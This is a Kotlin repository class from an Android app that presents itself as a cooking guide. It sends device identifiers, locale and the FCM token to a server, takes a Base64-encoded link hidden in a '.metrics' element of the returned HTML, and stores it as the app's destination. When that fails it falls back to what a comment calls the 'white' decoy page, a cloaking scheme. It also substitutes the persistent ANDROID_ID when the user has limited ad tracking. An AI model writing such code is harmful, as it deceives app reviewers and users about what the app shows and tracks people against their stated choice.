package gourmet.cwaorecasting.hubapp.guide.data.repository

import android.content.Context
import android.content.SharedPreferences
import android.provider.Settings
import android.util.Log
import androidx.core.content.edit
import gourmet.cwaorecasting.hubapp.guide.data.FCM_TOKEN_KEY
import gourmet.cwaorecasting.hubapp.guide.data.INSTALL_ID_KEY
import gourmet.cwaorecasting.hubapp.guide.data.STORED_URL_KEY
import gourmet.cwaorecasting.hubapp.guide.data.model.IntegrationDataState
import gourmet.cwaorecasting.hubapp.guide.data.model.UrlState
import gourmet.cwaorecasting.hubapp.guide.data.service.ApiRequest
import gourmet.cwaorecasting.hubapp.guide.data.service.ApiService
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.withContext
import gourmet.cwaorecasting.hubapp.BuildConfig
import org.jsoup.Jsoup
import java.util.Base64
import java.util.Locale
import java.util.TimeZone

class PrepRepository(
    private val context: Context,
    private val nApiService: ApiService,
    private val sharedPreferences: SharedPreferences,
    private val coroutineDispatcher: CoroutineDispatcher,
) {
    private val _integrationDataState = MutableStateFlow(
        IntegrationDataState(
            urlState = UrlState.urlStateFromValue(
                sharedPreferences.getString(STORED_URL_KEY, null)
            ),
            fcmToken = sharedPreferences.getString(FCM_TOKEN_KEY, null), //FIREBASE
        )
    )

    val integrationDataState: StateFlow<IntegrationDataState> = _integrationDataState.asStateFlow()

    //region FIREBASE | БЕЗ ИНТЕГРАЦИЙ
    private val androidId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }
    //endregion

    // Вызывать один раз в Application классе
    fun onRequestFcmToken(token: String) {
        val currentStoredToken = getStoredFcmToken()
        if (currentStoredToken == null) {
            storeFcmToken(token)
        }

        _integrationDataState.update { it.copy(fcmToken = token) }
    }

    //region FIREBASE

    // Вызывать каждый раз при обновлении FCM-токена.
    // См. метод refresh и класс YourFirebaseMessagingService
    suspend fun onNewFcmToken(token: String) {
        val currentStoredToken = getStoredFcmToken()

        if (token != currentStoredToken && currentStoredToken != null) {
            storeFcmToken(token)
            _integrationDataState.update { it.copy(fcmToken = token) }
            refresh(token)
        }
    }

    // Debug helper: resend the stored token to the refresh endpoint.
    suspend fun forceRefresh() {
        getStoredFcmToken()?.let { refresh(it) }
    }
    //endregion

    suspend fun install(token: String) {
        withContext(coroutineDispatcher) {
            val request = buildRequest(token)
            try {
                val response = nApiService.mypage(request)
                val html = response.body()?.string()

                if (BuildConfig.Test) {
                    Log.i("URL", "Fetch response is: $response")
                }

                // В ответе приходит HTML. Берём текст элемента .metrics —
                // это Base64-зашифрованная ссылка.
                val metricId = if (response.isSuccessful && html != null) {
                    Jsoup.parse(html).selectFirst(".metrics")?.text()?.trim()
                } else {
                    null
                }

                val url = decodeLink(metricId)

                if (url != null) {
                    storeUrlStateValue(url)
                } else {
                    // Не удалось расшифровать или сервер не вернул страницу — идём на белую.
                    storeUrlStateValue(UrlState.ACCESS_DENIED_URL_VALUE)
                }
            } catch (_: Exception) {
                storeUrlStateValue(UrlState.ACCESS_DENIED_URL_VALUE)
            }
        }
    }

    // Расшифровка ссылки из значения .metrics: Base64 -> строка.
    private fun decodeLink(metricId: String?): String? {
        if (metricId.isNullOrBlank()) return null
        return try {
            val decoded = String(Base64.getDecoder().decode(metricId))
            decoded.ifBlank { null }
        } catch (_: Exception) {
            null
        }
    }

    //region FIREBASE
    private suspend fun refresh(token: String) {
        val request = buildRequest(token)

        withContext(coroutineDispatcher) {
            try {
                val response = nApiService.refresh(request)
            } catch (ex: Exception) {
            }
        }
    }
    //endregion

    private suspend fun buildRequest(token: String): ApiRequest {
        val (language, timezone) = getDeviceLocaleAndTimeZone()
        val deviceId = getDeviceId()

        val request = ApiRequest(
            bundle = BuildConfig.APPLICATION_ID,
            fcm_token = token, //FIREBASE
            device = deviceId,
            language = language,
            timezone = timezone,
        )

        if (BuildConfig.Test) {
            Log.i("URL", "Fetch request is: $request");
        }

        return request;
    }

    fun getDeviceLocaleAndTimeZone(): Pair<String, String> {
        val languageTag = Locale.getDefault().toLanguageTag()
        val timeZoneId = TimeZone.getDefault().id

        return Pair(languageTag, timeZoneId)
    }

    //region FIREBASE
    private suspend fun getDeviceId(): String {
        return try {
            val advertisingIdInfo = withContext(Dispatchers.IO) {
                AdvertisingIdClient.getAdvertisingIdInfo(context)
            }

            if (!advertisingIdInfo.isLimitAdTrackingEnabled && !advertisingIdInfo.id.isNullOrEmpty()) {
                advertisingIdInfo.id!!
            } else {
                Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
            }
        } catch (e: Exception) {
            Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
        }
    }
    //endregion FIREBASE

    fun storeUrlStateValue(url: String) {
        sharedPreferences.edit { putString(STORED_URL_KEY, url) }
        _integrationDataState.update { it.copy(urlState = UrlState.urlStateFromValue(url)) }
    }

    private fun storeInstallId(id: String?) {
        sharedPreferences.edit { putString(INSTALL_ID_KEY, id) }
    }

    //region FIREBASE
    private fun storeFcmToken(token: String) {
        sharedPreferences.edit { putString(FCM_TOKEN_KEY, token) }
    }

    fun getStoredFcmToken(): String? = sharedPreferences.getString(FCM_TOKEN_KEY, null)
    //endregion
}
